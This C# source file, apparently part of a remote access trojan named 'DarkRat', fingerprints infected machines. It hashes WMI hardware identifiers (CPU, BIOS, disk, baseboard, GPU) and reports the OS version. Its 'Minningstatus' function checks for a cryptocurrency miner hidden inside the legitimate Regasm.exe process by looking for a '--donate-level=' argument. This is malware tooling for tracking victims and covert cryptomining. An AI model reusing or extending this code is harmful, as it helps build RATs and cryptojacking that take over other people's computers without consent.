using System;
using System.Text;
using System.Management;

namespace DarkRat.Classes
{
    class Identification
    {
        public static string getHardwareID()
        {
            string tohash = identifier("Win32_Processor", "ProcessorId");
            tohash += "-" + identifier("Win32_BIOS", "SerialNumber");
            tohash += "-" + identifier("Win32_DiskDrive", "Signature");
            tohash += "-" + identifier("Win32_BaseBoard", "SerialNumber");
            tohash += "-" + identifier("Win32_VideoController", "Name");
            return Misc.hash(tohash);
        }

        /*   Credit to "Sowkot Osman" of CodeProject for "identifier" function
             Link: http://www.codeproject.com/Articles/28678/Generating-Unique-Key-Finger-Print-for-a-Computer
         */
        public static string identifier(string wmiClass, string wmiProperty)
        {
            string result = "";
            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
            System.Management.ManagementObjectCollection moc = mc.GetInstances();
            foreach (System.Management.ManagementObject mo in moc)
            {
                //Only get the first one
                if (result == "")
                {
                    try
                    {
                        result = mo[wmiProperty].ToString();
                        break;
                    }
                    catch { }
                }
            }
            return result;
        }

        public static string osName()
        {
            return (new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.Replace("Microsoft ", "") + " " + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE"));
        }

        public static string videoId()
        {
            return identifier("Win32_VideoController", "Name");
        }
        public static string cpuId()
        {
            //Uses first CPU identifier available in order of preference
            //Don't get all identifiers, as it is very time consuming
            string retVal = identifier("Win32_Processor", "Name");
          
            return retVal;
        }



        public static string Minningstatus()
        {
            try
            {
                System.Diagnostics.Process[] p;
                p = System.Diagnostics.Process.GetProcessesByName("Regasm");
                if ((p.Length > 0))
                {
                    try
                    {
                        string wmiQuery = string.Format("select CommandLine from Win32_Process where Name='{0}'", "Regasm.exe");
                        System.Management.ManagementObjectSearcher searcher = new System.Management.ManagementObjectSearcher(wmiQuery);
                        System.Management.ManagementObjectCollection retObjectCollection = searcher.Get();
                        foreach (System.Management.ManagementObject retObject in retObjectCollection)
                        {
                            if (retObject["CommandLine"].ToString().Contains("--donate-level="))
                            {
                                return "Minning";
                            }

                        }

                    }
                    catch (Exception ex)
                    {
                    }

                }


            }
            catch (Exception ex)
            {

            }
            return "Idle";
        }

        public static string Minningstatusgpu()
        {
            return "Idle";
        }

    }
}
